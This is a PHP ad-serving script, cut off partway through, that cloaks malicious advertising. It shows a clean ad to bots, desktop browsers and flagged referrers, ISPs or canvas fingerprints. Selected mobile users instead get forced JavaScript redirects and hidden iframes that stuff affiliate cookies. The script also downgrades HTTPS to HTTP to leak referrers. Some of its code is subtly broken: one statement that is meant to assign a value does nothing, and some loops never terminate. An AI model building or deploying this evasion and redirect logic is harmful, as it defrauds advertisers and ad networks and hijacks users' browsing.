<?php

	$__VERSION = "5.6-rev1";

	if (array_key_exists("version", $_GET))
	{
		echo $__VERSION;
		exit;
	}

	//
	// Script usage: http(s)://host/dir/ad.php?<id>
	//
	//
	// This script spits out a clean HTML ad if it detects it's either been accessed by
	// a) A non mobile browser (user agent)
	// b) The IP address is not in the allowed ISP list or blocked due to any blocked lists
	//
	// In all other cases it returns a HTML page with an body onload event, and javascript functiont that redirects to the redirect Url. The scripts basically replaces 2 tags in the
	// clean html: {script}, and {onload}. These tags should be placed in the <head>{script}</head>, and <body{onload}></body> of the clean Html.
	//
	// Ad configuration resides in the <id>.config.txt file, and can define the redirectUrl, the ad language (locale), and which redirect method should be used.
	//

	require_once("include/adlib.inc");
	require_once("include/csvlib.inc");
	require_once("include/shared_file_access.inc");

	$allowedIspsPerCountry = array("US" => array("AT&T Wireless",
												 "T-Mobile USA",
												 "Sprint PCS",
												 "Verizon Wireless",
												 "Comcast Cable",
												 "Time Warner Cable",
												 "AT&T U-verse",
												 "Charter Communications",
												 "Cox Communications",
												 "CenturyLink",
												 "Optimum Online",
												 "AT&T Internet Services",
												 "Frontier Communications",
												 "Suddenlink Communications",
												 "XO Communications",
												 "Verizon Internet Services",
												 "Mediacom Cable",
												 "Windstream Communications",
												 "Bright House Networks",
												 "Abovenet Communications",
												 "Google",
												 "Cable One", "VECTANT"),
								   "MX" => array("Telmex","Mega Cable, S.A. de C.V.","Cablemas Telecomunicaciones SA de CV","Cablevisión, S.A. de C.V.","Iusacell","Television Internacional, S.A. de C.V.","Mexico Red de Telecomunicaciones, S. de R.L. de C.","Axtel","Cablevision S.A. de C.V.","Nextel Mexico","Telefonos del Noroeste, S.A. de C.V.","Movistar México","RadioMovil Dipsa, S.A. de C.V."),
								   "FR" => array("Orange","Free SAS","SFR","OVH SAS","Bouygues Telecom","Free Mobile SAS","Bouygues Mobile","Numericable","Orange France Wireless"),
								   "UK" => array("BT","Three","EE Mobile","Telefonica O2 UK","Vodafone","Vodafone Limited"),
								   "AU" => array("Optus","Telstra Internet","Vodafone Australia","TPG Internet","iiNet Limited","Dodo Australia"),
								   "JP" => array("Kddi Corporation","Softbank BB Corp","NTT","Open Computer Network","NTT Docomo,INC.","K-Opticom Corporation","@Home Network Japan","So-net Entertainment Corporation","Biglobe","Jupiter Telecommunications Co.","TOKAI","VECTANT"),
								   "KR" => array("SK Telecom","Korea Telecom","SK Broadband","POWERCOM","Powercomm","LG Powercomm","LG DACOM Corporation","Pubnetplus","LG Telecom"),
								   "BR" => array("Virtua","Vivo","NET Virtua","Global Village Telecom","Oi Velox","Oi Internet","Tim Celular S.A.","Embratel","CTBC","Acom Comunicacoes S.A."),
								   "IN" => array("Airtel","Bharti Airtel Limited","Idea Cellular","Vodafone India","BSNL","Reliance Jio INFOCOMM","Airtel Broadband","Beam Telecom","Tata Mobile","Aircel","Reliance Communications","Hathway","Bharti Broadband")
								  );

	$blacklistedSubDivs1 	= array();
	$blacklistedSubDivs2 	= array(); 
	$blacklistedCountries 	= array();
	$blacklistedContinents 	= array();

	$f_apps_iosBaseFilename 	= "config/f_apps_ios_";
	$f_apps_androidBaseFilename = "config/f_apps_android_";
	$f_site_BaseFilename 		= "config/f_site_";
	$f_siteid_BaseFilename 		= "config/f_siteid_";
	$csvFileSuffix				= ".csv";

	function getCSVContentAsArray($filename)
	{
		$result = array();

		// Load file
		$fileContents = file_get_contents_shared_access($filename);
		if ($fileContents !== false)
		{
			// Parse CSV
			$parsed = parse_csv($fileContents);

			// Convert it into an associate array
			foreach ($parsed as $fields)
			{
				$result[$fields[0]] = $fields[1];
			}
		}

		return $result;
	}

	function appendReferrerParameter($url)
	{
		$url = appendParameterPrefix($url);
		$url .= "referrer=";

		return $url;
	}

	function detectMobileOS()
	{
		 $osArray = array("/iphone/i"	=>  "iOS",
	                      "/ipod/i"		=>  "iOS",
	                      "/ipad/i"		=>  "iOS",
	                      "/android/i"	=>  "Android"
		                 );

	    foreach ($osArray as $regex => $value)
	    { 
	        if (preg_match($regex, $_SERVER['HTTP_USER_AGENT']))
	        {
	            return $value;
	        }
	    }

	    return null;
	}

	function isMultiDimensionalArray($array)
	{
		foreach ($array as $element)
		{
			if (is_array($element))
			{
				return true;
			}
		}

		return false;
	}

	function generateAutoRotateParameter($parameter, $sourceWeightList)
	{
		$result = "$parameter=";
		$os = detectMobileOS();

		if ($os != null && array_key_exists($os, $sourceWeightList))
		{
			$result .= weightedRand($sourceWeightList[$os]);
		}
		elseif (!empty($sourceWeightList) && !isMultiDimensionalArray($sourceWeightList))
		{
			$result .= weightedRand($sourceWeightList);	
		}

		return $result;
	}

	function appendAutoRotateParameter($url, $parameter, $sourceWeightList)
	{
		return appendParameterPrefix($url) . generateAutoRotateParameter($parameter, $sourceWeightList);
	}

	function minify($text)
	{
		$text = str_replace("\n", "", $text);
		$text = str_replace("\r", "", $text);
		$text = str_replace("\t", "", $text);

		return $text;
	}

	function createJSCode($resultHtml)
	{
		$resultHtml = minify($resultHtml);
		$resultHtml = str_replace("'", "\\'", $resultHtml);

		$resultHtml = "document.write('" . $resultHtml . "');";

		return $resultHtml;
	}

	function renderHTMLTemplate($templateName, $templateParameters)
	{
		$templateFilename = "profiles/htmltemplates/$templateName.html";

		$template = file_get_contents($templateFilename);

		foreach ($templateParameters as $parameter => $parameterValue)
		{
			if (is_array($parameterValue))
			{
				$template = str_replace($parameter, "'" . implode("','", $parameterValue) . "'", $template);
			}
			else
			{
				$template = str_replace($parameter, $parameterValue, $template);
			}
		}

		return $template;
	}

	function adlog($campaignID, $ip, $isp, $txt)
	{
		$logFilename = "logs/adlog.$campaignID.log.csv";
		writeLog($logFilename, $ip, $isp, array("Message" => $txt));
	}

	function mbotlog($campaignID, $ip, $isp, $txt)
	{
		$logFilename = "logs/mbotlog.$campaignID.log.csv";
		writeLog($logFilename, $ip, $isp, array("Message" => $txt));
	}

	function allowedTrafficLog($campaignID, $ip, $isp)
	{
		$logFilename = "logs/allowed_traffic.$campaignID.log.csv";
		writeLog($logFilename, $ip, $isp, array("Message" => "CHECK:ALLOWED_TRAFFIC: Serving dirty ad."));
	}

	/* Get the page referer or a default value for it */
	function getReferer($default = "Unknown") 
	{
		/* If dealing with a GET request, and an override of the referrer is provided, use it */
		if ($_SERVER['REQUEST_METHOD'] === 'GET') {
			if (array_key_exists("org_referer", $_GET)) {
				return urldecode($_GET["org_referer"]);
			}
		}
		
		return array_key_exists('HTTP_REFERER', $_SERVER) 
			? $_SERVER['HTTP_REFERER'] 
			: $default;
	}
	
	function trafficLoggerLog($campaignID, $extra = array())
	{
		$logFilename = "logs/traffic_logger.$campaignID.log.csv";
		
		$ip  = getClientIP();
		$isp = getISPInfo($ip);
		$items = array(
				"RequestMethod" => $_SERVER['REQUEST_METHOD']
				);
		$items = array_merge($items, $extra);
		
		writeLog($logFilename, $ip, $isp["isp"], $items);
		return;

		$referrer = getReferer("Unknown");

		$ip  = getClientIP();
		$isp = getISPInfo($ip);

		return "ISP|\"".$isp["isp"]."\"|QueryString|\"".$_SERVER['QUERY_STRING']."\"|Server Referrer|\"".$referer."\"|";
	}	

	function handleTrafficLoggerData($campaignID)
	{
		if ($_SERVER['REQUEST_METHOD'] == "POST" && array_key_exists("data", $_POST))
		{
			$info = array("Javascript" => "true");
						  
			/* Decompose QueryString into its parts and append them to the log */
			$count = 0;
			$decoded = explode("^",urldecode($_POST['data']));
			for ($i = 0; $i < count($decoded); $i+=2) {
				$info[$decoded[$i]] = $decoded[$i+1];
				$count++;
			}
			while ($count < 11) {
				$info["u".$count] = "";
			}
			
			trafficLoggerLog($campaignID, $info);

			echo "OK";

			exit;
		}

		if ($_SERVER['REQUEST_METHOD'] == "GET")
		{
			/* GET method as a way to report information */
			if (array_key_exists("data", $_GET))
			{
				$info = array("Javascript" => "true");
				
				/* Decompose QueryString into its parts and append them to the log */
				$count = 0;
				$decoded = explode("^",urldecode($_GET['data']));
				for ($i = 0; $i < count($decoded); $i+=2) {
					$info[$decoded[$i]] = $decoded[$i+1];
				}
				while ($count < 11) {
					$info["u".$count] = "";
				}
				
				trafficLoggerLog($campaignID, $info);
				
				// Create a blank image
				$im = imagecreatetruecolor(1, 1);

				// Set the content type header - in this case image/gif
				header('Content-Type: image/gif');

				// Output the image
				imagegif($im);

				// Free up memory
				imagedestroy($im);
				
				exit;
			}
			elseif (array_key_exists("nojs", $_GET) && $_GET['nojs'] == 1)
			{		
				$info = array("Javascript" => "false",
							  /* All the following were not found, but lets fill them to avoid missing columns */
							  "Referrer" => "",
							  "Browser Res" => "",
							  "UserAgent" => "",
							  "AppVersion" => "",
							  "Platform" => "",
							  "Is Touch" => "",
							  "Touch Points" => "",
							  "Is Sandboxed" => "",
							  "CanvasFingerPrint" => "",
							  "Location Hash" => "",
							  "Location Search" => "");
			
				trafficLoggerLog($campaignID, $info);
				
				// Create a blank image
				$im = imagecreatetruecolor(1, 1);

				// Set the content type header - in this case image/gif
				header('Content-Type: image/gif');

				// Output the image
				imagegif($im);

				// Free up memory
				imagedestroy($im);
				exit;
			}
		}		
	}

	/* Function to check if page was served using HTTPS or not */
	function wasHTTPSServed()
    {
		if (array_key_exists('HTTPS',$_SERVER) && $_SERVER['HTTPS'] !== 'off')
            return true;

        if( !empty( $_SERVER['HTTP_X_FORWARDED_PROTO'] ) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https' )
            return true;

        return false;
    }
	
	/* Get the campaign ID and the Query String */
	$queryString = $_SERVER['QUERY_STRING'];
	$ampIndex = strpos($queryString, "&");
	if ($ampIndex !== false) {
		$campaignID = substr($queryString, 0, $ampIndex);
		$queryString = substr($queryString, $ampIndex + 1);
	} else {
		$campaignID = $queryString;
		$queryString = "";
	}

	/* Load the configuration for that campaign */
	$configFilename  = "ads/" . $campaignID . ".config.txt";
	if (!file_exists($configFilename)) {
		exit;
	}
	$adConfig = processAdConfig($configFilename);

	/* Process the configuration */
	$redirectUrl 					= array_key_exists("RedirectUrl", $adConfig) ? $adConfig["RedirectUrl"] : "";
	$redirectMethod 				= array_key_exists("Method", $adConfig) ? $adConfig["Method"] : "";
	$redirectSubMethod1				= array_key_exists("RedirectSubMethod1", $adConfig) ? $adConfig["RedirectSubMethod1"] : "";
	$redirectSubMethod2				= array_key_exists("RedirectSubMethod2", $adConfig) ? $adConfig["RedirectSubMethod2"] : "";
	$redirectTimeout 				= array_key_exists("RedirectTimeout", $adConfig) ? $adConfig["RedirectTimeout"] : 3000;
	$redirectEnabled				= array_key_exists("RedirectEnabled", $adConfig) && $adConfig["RedirectEnabled"] === "false" ? false : true;
	$voluumAdCycleCount				= array_key_exists("VoluumAdCycleCount", $adConfig) ? $adConfig["VoluumAdCycleCount"] : -1;
	$adCountry 						= array_key_exists("CountryCode", $adConfig) ? $adConfig["CountryCode"] : "";
	$allowedIspsPerCountry			= array_key_exists("AllowedISPS", $adConfig) && !empty($adConfig["AllowedISPS"]) ? array($adCountry => preg_split("/\|/", $adConfig["AllowedISPS"], -1, PREG_SPLIT_NO_EMPTY)) : $allowedIspsPerCountry;
	$blacklistedProvinces 			= array_key_exists("ProvinceBlackList", $adConfig) ? preg_split("/\|/", $adConfig["ProvinceBlackList"], -1, PREG_SPLIT_NO_EMPTY) : array();
	$blacklistedCities 				= array_key_exists("CityBlackList", $adConfig) ? preg_split("/\|/", $adConfig["CityBlackList"], -1, PREG_SPLIT_NO_EMPTY) : array();
	$canvasFingerprintCheckEnabled 	= array_key_exists("CanvasFingerprintCheckEnabled", $adConfig) && $adConfig["CanvasFingerprintCheckEnabled"] === "false" ? false : true;
	$blockedCanvasFingerprints		= array_key_exists("BlockedCanvasFingerprints", $adConfig) ? $adConfig["BlockedCanvasFingerprints"] : "";
	$outputMethod 					= array_key_exists("OutputMethod", $adConfig) ? $adConfig["OutputMethod"] : "";
	$trackingPixelEnabled			= array_key_exists("TrackingPixelEnabled", $adConfig) && $adConfig["TrackingPixelEnabled"] === "false" ? false : true;
	$trackingPixelUrl 				= array_key_exists("TrackingPixelUrl", $adConfig) ? $adConfig["TrackingPixelUrl"] : "";
	$loggingEnabled 				= array_key_exists("LoggingEnabled", $adConfig) && $adConfig["LoggingEnabled"] === "false" ? false : true;
	$ispCloakingEnabled 			= array_key_exists("ISPCloakingEnabled", $adConfig) && $adConfig["ISPCloakingEnabled"] === "false" ? false : true;
	$iframeCloakingEnabled 			= array_key_exists("IFrameCloakingEnabled", $adConfig) && $adConfig["IFrameCloakingEnabled"] === "false" ? false : true;
	$pluginCloakingEnabled 			= array_key_exists("PluginCloakingEnabled", $adConfig) && $adConfig["PluginCloakingEnabled"] === "false" ? false : true;
	$touchCloakingEnabled 			= array_key_exists("TouchCloakingEnabled", $adConfig) && $adConfig["TouchCloakingEnabled"] === "false" ? false : true;
	$blacklistedReferrers 			= array_key_exists("BlacklistedReferrers", $adConfig) ? preg_split("/\|/", $adConfig["BlacklistedReferrers"], -1, PREG_SPLIT_NO_EMPTY) : array();
	$whitelistedReferrers 			= array_key_exists("WhitelistedReferrers", $adConfig) ? preg_split("/\|/", $adConfig["WhitelistedReferrers"], -1, PREG_SPLIT_NO_EMPTY) : array();
	$blockedParameterValues			= array_key_exists("BlockedParameterValues", $adConfig) ? json_decode($adConfig["BlockedParameterValues"]) : array();
	$blockedReferrerParameterValues	= array_key_exists("BlockedReferrerParameterValues", $adConfig) ? json_decode($adConfig["BlockedReferrerParameterValues"]) : array();
	$consoleLoggingEnabled 			= array_key_exists("ConsoleLoggingEnabled", $adConfig) && $adConfig["ConsoleLoggingEnabled"] === "false" ? false : true;
	$forceDirtyAd 					= array_key_exists("ForceDirtyAd", $adConfig) && $adConfig["ForceDirtyAd"] === "false" ? false : true;
	$trafficLoggerEnabled			= array_key_exists("TrafficLoggerEnabled", $adConfig) && $adConfig["TrafficLoggerEnabled"] === "true" ? true : false;
	$iFrameCookiesEnabled			= array_key_exists("IFrameCookiesEnabled", $adConfig) && $adConfig["IFrameCookiesEnabled"] === "true" ? true : false;
	$affiliateLinkUrl				= array_key_exists("AffiliateLinkUrl", $adConfig) ? json_decode($adConfig["AffiliateLinkUrl"]) : array();
	$HTMLTemplate 					= array_key_exists("HTMLTemplate", $adConfig) ? $adConfig["HTMLTemplate"] : "";
	$HTMLTemplateValues 			= array_key_exists("HTMLTemplateValues", $adConfig) ? json_decode($adConfig["HTMLTemplateValues"]) : "";
	$HTTPStoHTTP					= array_key_exists("HTTPStoHTTP", $adConfig) && $adConfig["HTTPStoHTTP"] === "true" ? true : false;
	
	/* If the page was served as HTTPS and we are asked to downgrade to HTTP ... */
	if ($HTTPStoHTTP && wasHTTPSServed()) {
		
		/* Get the equivalent HTTP URL */
		$http_url = "http://".$_SERVER["HTTP_HOST"].$_SERVER["REQUEST_URI"];
		
		/* Perform a redirection to it */
		
		/* Permanent redirection */
		header("HTTP/1.1 301 Moved Permanently"); 
		
		/* Make sure to pass the Referrer to the HTTP version of the site */
		header("Referrer-Policy: unsafe-url");
		
		/* Get the referrer of this site and append it as the last url parameter */
		$referer = getReferer("");
		if (strpos($http_url,'?') !== false) {
			$http_url .= '&org_referer='.urlencode($referer);
		} else {
			$http_url .= '?org_referer='.urlencode($referer);
		}
		
		/* And perform the redirection */
		header("Location: ".$http_url, true, 301); 
		exit;
	}
	
	// Set ad.php click ID cookie
	$adClickID = uniqid("", true);
	setcookie("_c", $adClickID, strtotime("+1 year"));

	// ad.php visits
	$adVisits = isset($_COOKIE["_v"]) ? $_COOKIE["_v"] + 1 : 1;
	setcookie("_v", $adVisits, strtotime("+1 year"));
	
	/* Perform logging */
	handleTrafficLoggerData($campaignID);
	
	if (!empty($HTMLTemplate))
	{
		$resultHtml = renderHTMLTemplate($HTMLTemplate, $HTMLTemplateValues);
	}
	else
	{
		$cleanHtmlFilename = "ads/" . $campaignID . ".cleanad.html";
		$resultHtml = file_get_contents($cleanHtmlFilename);
	}

	if (empty($adCountry))
	{
		$adCountry = "US";
	}

	$ip  = getClientIP();
	$geo = getGEOInfo($ip);
	$isp = getISPInfo($ip);

	if ($loggingEnabled)
	{
		adlog($campaignID, $ip, $isp["isp"],
			"INFO:GEO:" .
			'ip:"'.$ip.'",'.
			'isp:"'.$isp["isp"].'",'.
			'city:"'.$geo['city'].'",'.
			'province:"'.$geo['province'].'",'.
			'country:"'.$geo['country'].'",'.
			'country_code:"'.$geo['country_code'].'",'.
			'continent:"'.$geo['continent'].'",'.
			'continent_code:"'.$geo['continent_code'].'",'.
			'subdiv1:"'.$geo['subdiv1'].'",'.
			'subdiv1_code:"'.$geo['subdiv1_code'].'",'.
			'subdiv2:"'.$geo['subdiv2'].'",'.
			'subdiv2_code:"'.$geo['subdiv2_code'].'"');
	}

	$trackingPixelCloakTestParameters = array();

	if ($trafficLoggerEnabled)
	{
		$serveCleanAd = true;

		if ($loggingEnabled)
		{
			adlog($campaignID, $ip, $isp["isp"], "Traffic Logger Enabled.");
		}		
	}
	else
	{
		$serveCleanAd = false;
	}

	if (!$serveCleanAd)
	{
		foreach ($blacklistedReferrers as $blackListedReferrer)
		{
			if (strpos(getReferer("_empty_"), $blackListedReferrer) !== false)
			{
				$serveCleanAd = true;

				if ($loggingEnabled)
				{
					mbotlog($campaignID, $ip, $isp["isp"], "CHECK:REFERRER_BLACKLIST_BLOCKED:".getReferer("_empty_").": Referrer ".getReferer("_empty_")." is in blacklist.");
				}

				break;
			}
		}

		if (!$serveCleanAd && $loggingEnabled)
		{
			mbotlog($campaignID, $ip, $isp["isp"], "CHECK:REFERRER_BLACKLIST_ALLOWED:".getReferer("_empty_").": Referrer ".getReferer("_empty_")." is NOT in blacklist.");
		}

		if (!$serveCleanAd && !empty($whitelistedReferrers))
		{
			$matchedWhitelistedReferrer = false;

			foreach ($whitelistedReferrers as $whitelistedReferrer)
			{
				if (strpos(getReferer("_empty_"), $whitelistedReferrer) !== false)
				{
					$matchedWhitelistedReferrer = true;

					break;
				}
			}

			if (!$matchedWhitelistedReferrer)
			{
				$serveCleanAd = true;

				if ($loggingEnabled)
				{
					mbotlog($campaignID, $ip, $isp["isp"], "CHECK:REFERRER_WHITELIST_BLOCKED:".getReferer("_empty_").": Referrer ".getReferer("_empty_")." is not in whitelist.");
				}
			}
			elseif ($loggingEnabled)
			{
				mbotlog($campaignID, $ip, $isp["isp"], "CHECK:REFERRER_WHITELIST_ALLOWED:".getReferer("_empty_").": Referrer ".getReferer("_empty_")." is in whitelist.");
			}
		}
	}

	// Check querystring parameters against blocked parameter values
	if (!$serveCleanAd)
	{
		foreach ($blockedParameterValues as $parameter => $blockedValues)
		{
			if (array_key_exists($parameter, $_GET))
			{
				if (in_array($_GET[$parameter], $blockedValues))
				{
					$serveCleanAd = true;

					if ($loggingEnabled)
					{
						mbotlog($campaignID, $ip, $isp["isp"], "CHECK:PARAMETER_BLOCKED:$parameter:$_GET[$parameter]: Parameter $parameter has blocked value: $_GET[$parameter].");
					}

					break;
				}
				else if ($loggingEnabled)
				{
					mbotlog($campaignID, $ip, $isp["isp"], "CHECK:PARAMETER_ALLOWED:$parameter:$_GET[$parameter]: Parameter $parameter with value $_GET[$parameter] is allowed.");
				}
			}
			else
			{
				$serveCleanAd = true;

				if ($loggingEnabled)
				{
					mbotlog($campaignID, $ip, $isp["isp"], "CHECK:PARAMETER_MISSING:$parameter: Parameter $parameter missing from querystring.");
				}

				break;
			}
		}
	}

	// Check referrer querystring parameters against blocked parameter values

	$referrerParameters = array();
	parse_str(parse_url(getReferer("_empty_"), PHP_URL_QUERY), $referrerParameters);

	if (!$serveCleanAd)
	{
		foreach ($blockedReferrerParameterValues as $parameter => $blockedValues)
		{
			if (array_key_exists($parameter, $referrerParameters))
			{
				if (in_array($referrerParameters[$parameter], $blockedValues))
				{
					$serveCleanAd = true;

					if ($loggingEnabled)
					{
						mbotlog($campaignID, $ip, $isp["isp"], "CHECK:REFERRER_PARAMETER_BLOCKED:$parameter:$referrerParameters[$parameter]: Parameter $parameter has blocked value: $referrerParameters[$parameter].");
					}

					break;
				}
				else if ($loggingEnabled)
				{
					mbotlog($campaignID, $ip, $isp["isp"], "CHECK:REFERRER_PARAMETER_ALLOWED:$parameter:$referrerParameters[$parameter]: Parameter $parameter with value $referrerParameters[$parameter] is allowed.");
				}
			}
			else
			{
				$serveCleanAd = true;

				if ($loggingEnabled)
				{
					mbotlog($campaignID, $ip, $isp["isp"], "CHECK:REFERRER_PARAMETER_MISSING:$parameter: Parameter $parameter missing from referrer querystring.");
				}

				break;
			}
		}
	}

	if (!$serveCleanAd && !preg_match('/(iPhone|iPod|iPad|Android|BlackBerry|IEMobile|MIDP|BB10)/i', $_SERVER['HTTP_USER_AGENT']))
	{
		$serveCleanAd = true;

		if ($loggingEnabled)
		{
			adlog($campaignID, $ip, $isp["isp"], "CHECK:USERAGENT_MOBILE:$_SERVER[HTTP_USER_AGENT]: UserAgent is not a mobile device.");
		}
	}
	elseif (!$serveCleanAd && $ispCloakingEnabled)
	{
		$allowedIsps = array();

		if (array_key_exists($adCountry, $allowedIspsPerCountry))
		{
			$allowedIsps = $allowedIspsPerCountry[$adCountry];
		}

		if ((empty($allowedIsps) || in_array($isp["isp"], $allowedIsps)) &&
			!in_array($geo['city'], $blacklistedCities) &&
			!in_array($geo['province'], $blacklistedProvinces) &&
			!in_array($geo['subdiv1_code'], $blacklistedSubDivs1) &&
			!in_array($geo['subdiv2_code'], $blacklistedSubDivs2) &&
			!in_array($geo['country'], $blacklistedCountries) &&
			!in_array($geo['continent'], $blacklistedContinents))
		{
			$serveCleanAd - false;

			$trackingPixelCloakTestParameters[] = "ispAllowed=" . urlencode($isp["isp"]);

			if ($loggingEnabled)
			{
				adlog($campaignID, $ip, $isp["isp"], "CHECK:GEO_ALLOWED: ISP/Geo is allowed. ISP: " . $isp["isp"]);
			}
		}
		else
		{
			$serveCleanAd = true;

			$trackingPixelCloakTestParameters[] = "ispBlocked=" . urlencode($isp["isp"]);

			if ($loggingEnabled)
			{
				adlog($campaignID, $ip, $isp["isp"], "CHECK:GEO_BLOCKED: ISP/Geo is NOT allowed. ISP: " . $isp["isp"]);
			}
		}
	}

	$referrerDomainScript = "function getReferrerDomain()
						     {
					            var topDomain = '';

					            try
					            {
					                topDomain = window.top.location.href;
					            }
					            catch(e) { }

					            if (topDomain == null || topDomain === 'undefined' || typeof topDomain == 'undefined' || topDomain.trim() === '')
					            {
					                topDomain = document.referrer;
					            }

					            return topDomain;
						     }";

	if ($trackingPixelEnabled && !empty($trackingPixelUrl))
	{
		if (!empty($trackingPixelCloakTestParameters))
		{
			// Append cloaking test results for Voluum
			$trackingPixelUrl = appendParameterPrefix($trackingPixelUrl);
			$trackingPixelUrl .= implode("&", $trackingPixelCloakTestParameters);
		}

		// Append referrer
		$trackingPixelUrl = appendReferrerParameter($trackingPixelUrl);

		$trackingPixelScript = "function addTrackingPixel()
						        {
						            var topDomain = getReferrerDomain();

						            var el = document.createElement('img');
						            el.src = '$trackingPixelUrl' + encodeURIComponent(topDomain) + '&' + location.search.substring(1);
						            el.width = 0;
						            el.height = 0;
						            el.border = 0;
						            document.body.appendChild(el);
						        }";
	}

	if ($serveCleanAd && !$forceDirtyAd)
	{
		if ($loggingEnabled && !$redirectEnabled)
		{
			adlog($campaignID, $ip, $isp["isp"], "CHECK:REDIRECT_DISABLED: Redirect disabled.");
		}

		$scriptElements = array();
		$onloadElements = array();

		if ($trackingPixelEnabled && !empty($trackingPixelUrl))
		{
			$scriptElements[] = minify("<script type=\"text/javascript\">\n" . $referrerDomainScript . $trackingPixelScript . "\n</script>");
			$onloadElements[] = "addTrackingPixel();";
		}

		if ($trafficLoggerEnabled)
		{
			$scriptElements[] = "<script src=\"js/lg.me.js\"></script>";
			$onloadElements[] = "f.go('" . getCurrentPageUrl() . "');";
		}

		$resultHtml = str_replace("{script}", implode("\n", $scriptElements), $resultHtml);
		$resultHtml = str_replace("{onload}", !empty($onloadElements) ? " onload=\"" . implode("", $onloadElements) . "\"" : "", $resultHtml);

		if ($outputMethod === "JS")
		{
			$resultHtml = str_replace("{queryString}", $queryString, $resultHtml);

			$resultHtml = createJSCode($resultHtml);
		}
	}
	else
	{
		//Dirty page...
		
		if ($loggingEnabled)
		{
			allowedTrafficLog($campaignID, $ip, $isp["isp"]);

			if ($forceDirtyAd)
			{
				adlog($campaignID, $ip, $isp["isp"], "Force Dirty Ad enabled.");
			}
		}

		$f_apps_WeightList["iOS"] 		= getCSVContentAsArray($f_apps_iosBaseFilename . $adCountry . $csvFileSuffix);
		$f_apps_WeightList["Android"] 	= getCSVContentAsArray($f_apps_androidBaseFilename . $adCountry . $csvFileSuffix);

		$f_site_WeightList 				= getCSVContentAsArray($f_site_BaseFilename . $adCountry . $csvFileSuffix);
		$f_siteid_WeightList 			= getCSVContentAsArray($f_siteid_BaseFilename . $adCountry . $csvFileSuffix);

		// If a redirection Url was configured and enabled
		if (!empty($redirectUrl) && $redirectEnabled)
		{
			$redirectUrl = appendParameterPrefix($redirectUrl) . "ccid=$adClickID";
			if ($voluumAdCycleCount > 0)
			{
				$redirectUrl = appendParameterPrefix($redirectUrl) . "ad=" . (($adVisits % $voluumAdCycleCount) + 1);
			}
			// Append auto generated source parameter
			$redirectUrl = appendAutoRotateParameter($redirectUrl, "f_apps", $f_apps_WeightList);
			$redirectUrl = appendAutoRotateParameter($redirectUrl, "f_site", $f_site_WeightList);
			$redirectUrl = appendAutoRotateParameter($redirectUrl, "f_siteid", $f_siteid_WeightList);
			
			// Append passed in script parameters if outputMethod == JS
			if ($outputMethod === "JS")
			{
				$redirectUrl .= appendParameterPrefix($redirectUrl) . $queryString;
			}

			// Append referrer
			$redirectUrl = appendReferrerParameter($redirectUrl);

			// Get the redirect code (JS)
			if ($redirectMethod === "trycatchredirect")
			{
				$redirectCode = "try
								 {
									 " . getRedirectCode($redirectSubMethod1, $redirectUrl) . "
								 }
								 catch(e)
								 {
									try
									{
										" . getRedirectCode($redirectSubMethod2, $redirectUrl) . "
									}
									catch(e)
									{
									}
								 }";
			}
			else
			{
				$redirectCode = getRedirectCode($redirectMethod, $redirectUrl);
			}
		} else {
			// No redirection code at all
			$redirectCode = "";
		}

		// Perform logging if enabled
		if ($loggingEnabled)
		{
			adlog($campaignID, $ip, $isp["isp"], $redirectUrl);
		}

		$scriptCode = "<script type=\"text/javascript\">

			var testResults = [];

			function isTrue(value) 
			{ 
				return value === true; 
			}

			function addIframe(srcurl) 
			{
				var iframe = document.createElement('iframe');
				iframe.style.display = 'none';
				iframe.src = srcurl;
				iframe.sandbox = 'allow-top-navigation allow-popups allow-scripts allow-same-origin';
				document.body.appendChild(iframe);
			}
			
			if (typeof jslog !== 'function') {
				jslog = function(text) { " . ($consoleLoggingEnabled ? "console.log(text);" : "") . " }
			} " .

			($trackingPixelEnabled && !empty($trackingPixelUrl) ? $trackingPixelScript : "") .

			($iframeCloakingEnabled ? file_get_contents("js/iframetest.js") : "") .
			($pluginCloakingEnabled ? file_get_contents("js/plugintest.js") : "") .
			($touchCloakingEnabled ? file_get_contents("js/touchtest.js") : "") .
			($canvasFingerprintCheckEnabled && !empty($blockedCanvasFingerprints) ? file_get_contents("js/canvasfingerprinttest.js") : "") .

		   "function inBlockedCanvasList()
			{
				var blockedList = [null, $blockedCanvasFingerprints];
				var canvasFingerPrint = getCanvasFingerprint();

				var result = blockedList.indexOf(canvasFingerPrint) !== -1;

				if (result) {
					jslog('CHECK:CANVASFINGERPRINT_BLOCKED: CanvasFingerprint: ' + canvasFingerPrint + ' in blocked list.');
				} else {
					jslog('CHECK:CANVASFINGERPRINT_ALLOWED: CanvasFingerprint: ' + canvasFingerPrint + ' NOT in blocked list.');
				}

				return result;
			}

			$referrerDomainScript

			function go()
			{";
			
			$scriptCode .=
				($trackingPixelEnabled && !empty($trackingPixelUrl) ? "addTrackingPixel();\n" : "") .
				($iframeCloakingEnabled ? "testResults.push(inIFrame());\n" : "") .
				($pluginCloakingEnabled ? "testResults.push(!hasPlugins());\n" : "") .
				($touchCloakingEnabled ? "testResults.push(isTouch());\n" : "") .
				($canvasFingerprintCheckEnabled && !empty($blockedCanvasFingerprints) ? "testResults.push(!inBlockedCanvasList());\n" : "") .							
			   "jslog(testResults);

				if (testResults.every(isTrue)) {
					if (/(iphone|linux armv)/i.test(window.navigator.platform)) {
						jslog('CHECK:PLATFORM_ALLOWED: Platform test succeeded: ' + window.navigator.platform); ";

			// Add cookie drop code
			if (true && $iFrameCookiesEnabled) {
				foreach($affiliateLinkUrl as $cookieUrl) {
					if (strlen($cookieUrl) > 0) {
						
						$cookieUrl = appendParameterPrefix($cookieUrl) . "ccid=$adClickID";
						if ($voluumAdCycleCount > 0)
						{
							$cookieUrl = appendParameterPrefix($cookieUrl) . "ad=" . (($adVisits % $voluumAdCycleCount) + 1);
						}
						// Append auto generated source parameter
						$cookieUrl = appendAutoRotateParameter($cookieUrl, "f_apps", $f_apps_WeightList);
						$cookieUrl = appendAutoRotateParameter($cookieUrl, "f_site", $f_site_WeightList);
						$cookieUrl = appendAutoRotateParameter($cookieUrl, "f_siteid", $f_siteid_WeightList);
						
						// Append passed in script parameters if outputMethod == JS
						if ($outputMethod === "JS")
						{
							$cookieUrl .= appendParameterPrefix($cookieUrl) . $queryString;
						}

						// Append referrer
						$cookieUrl = appendReferrerParameter($cookieUrl);
						
						// Finally. add the iframe code
						$scriptCode .= "addIframe(\"".$cookieUrl."\");";
					}
				}
			}

			if (!empty($redirectCode)) {
			$scriptCode .=
						"setTimeout(function()
						{
							var topDomain = getReferrerDomain();

							$redirectCode
						}, $redirectTimeout);";
			}
			
			$scriptCode .= 
					"} else {
						jslog('CHECK:PLATFORM_BLOCKED: Platform test failed: ' + window.navigator.platform);
					}
